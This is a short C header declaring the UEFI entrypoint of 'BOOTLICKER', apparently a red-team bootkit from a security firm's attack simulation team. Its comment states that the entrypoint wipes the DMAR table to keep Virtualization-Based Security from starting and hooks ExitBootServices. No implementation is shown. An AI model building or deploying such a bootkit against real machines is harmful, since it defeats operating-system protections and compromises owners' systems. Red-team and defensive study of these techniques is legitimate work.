/*!
 *
 * BOOTLICKER
 *
 * GuidePoint Security LLC
 *
 * Threat and Attack Simulation Team
 *
!*/

#pragma once

/*!
 *
 * Purpose:
 *
 * Entrypoint for the BOOTLICKER. Wipes the DMAR
 * table to prevent Virtualized-Based-Security from
 * being initialized, copies itself to a new region
 * of memory, and sets a hook into the method table
 * of ExitBootServices.
 *
!*/
D_SEC( A ) EFI_STATUS EFIAPI EfiMain( _In_ EFI_HANDLE ImageHandle, _In_ EFI_SYSTEM_TABLE * SystemTable );
